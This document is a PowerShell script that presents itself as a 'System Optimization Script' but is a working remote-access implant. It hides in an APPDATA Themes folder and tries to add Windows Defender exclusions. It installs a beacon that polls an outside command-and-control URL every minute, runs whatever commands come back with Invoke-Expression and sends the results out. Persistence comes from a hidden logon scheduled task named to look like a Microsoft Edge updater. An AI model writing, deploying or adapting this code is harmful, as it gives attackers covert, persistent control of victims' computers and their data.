# System Optimization Script - Works WITHOUT disabling Defender
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$C2_URL = 'https://readme.sharansahu1604.workers.dev'
$VICTIM_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})

# Use ACCESSIBLE locations (not ProgramData!)
$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"  # Hidden in plain sight
$BeaconPath = "$InstallDir\ThemeService.ps1"
$LogFile = "$env:APPDATA\Microsoft\Windows\theme.log"

# Create log
"[$(Get-Date)] Installation started..." | Out-File $LogFile

try {
    # Create install directory
    if (!(Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    }
    
    "[$(Get-Date)] Install directory created: $InstallDir" | Out-File $LogFile -Append
    
    # Try to add Defender exclusions (may fail, but that's OK)
    try {
        Add-MpPreference -ExclusionPath $InstallDir -Force 2>$null
        Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows" -Force 2>$null
        "[$(Get-Date)] Defender exclusions attempted" | Out-File $LogFile -Append
    } catch {
        "[$(Get-Date)] Defender exclusions failed (OK, continuing anyway)" | Out-File $LogFile -Append
    }
    
    # Create beacon script
    $BeaconScript = @"
# Beacon Script - Runs in user context
`$C2_URL = '$C2_URL'
`$VICTIM_ID = '$VICTIM_ID'
`$LogFile = '$LogFile'

# Infinite beacon loop
while (`$true) {
    try {
        "[`$(Get-Date)] Beaconing to C2..." | Out-File `$LogFile -Append
        
        `$headers = @{
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            'X-Victim-ID' = `$VICTIM_ID
        }
        
        # Beacon
        `$response = Invoke-RestMethod -Uri "`$C2_URL/beacon" -Headers `$headers -Method Get -TimeoutSec 30
        
        "[`$(Get-Date)] Beacon response: `$response" | Out-File `$LogFile -Append
        
        if (`$response -and `$response -ne 'idle') {
            "[`$(Get-Date)] Executing: `$response" | Out-File `$LogFile -Append
            
            # Execute command
            `$output = Invoke-Expression `$response 2>&1 | Out-String
            
            # Send result
            Invoke-RestMethod -Uri "`$C2_URL/result" -Headers `$headers -Method Post -Body `$output -TimeoutSec 30 | Out-Null
            
            "[`$(Get-Date)] Result sent" | Out-File `$LogFile -Append
        }
    } catch {
        "[`$(Get-Date)] Beacon error: `$(`$_.Exception.Message)" | Out-File `$LogFile -Append
    }
    
    Start-Sleep 60
}
"@

    # Write beacon script
    Set-Content -Path $BeaconPath -Value $BeaconScript -Force
    
    "[$(Get-Date)] Beacon script created: $BeaconPath" | Out-File $LogFile -Append
    
    # Create persistence via Scheduled Task (works without admin!)
    $TaskName = "MicrosoftEdgeUpdateTaskMachineUA"  # Looks legitimate
    
    # Remove existing task if present
    schtasks /delete /tn $TaskName /f 2>$null
    
    # Create scheduled task
    $Action = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    
    # Task runs at logon and every 1 hour (backup)
    schtasks /create /tn $TaskName /tr "powershell.exe $Action" /sc ONLOGON /ru "$env:USERNAME" /f | Out-Null
    
    "[$(Get-Date)] Scheduled task created: $TaskName" | Out-File $LogFile -Append
    
    # Start beacon immediately
    Start-Process powershell.exe -ArgumentList $Action -WindowStyle Hidden
    
    "[$(Get-Date)] Beacon started!" | Out-File $LogFile -Append
    
    # Success message
    "[$(Get-Date)] Installation complete!" | Out-File $LogFile -Append
    "[$(Get-Date)] Beacon Path: $BeaconPath" | Out-File $LogFile -Append
    "[$(Get-Date)] Log File: $LogFile" | Out-File $LogFile -Append
    "[$(Get-Date)] Task Name: $TaskName" | Out-File $LogFile -Append
    
    Write-Host "Installation successful!"
    Write-Host "Log file: $LogFile"
    
} catch {
    $ErrorMsg = $_.Exception.Message
    "[$(Get-Date)] FATAL ERROR: $ErrorMsg" | Out-File $LogFile -Append
    Write-Host "Error: $ErrorMsg"
    Write-Host "Check log: $LogFile"
}
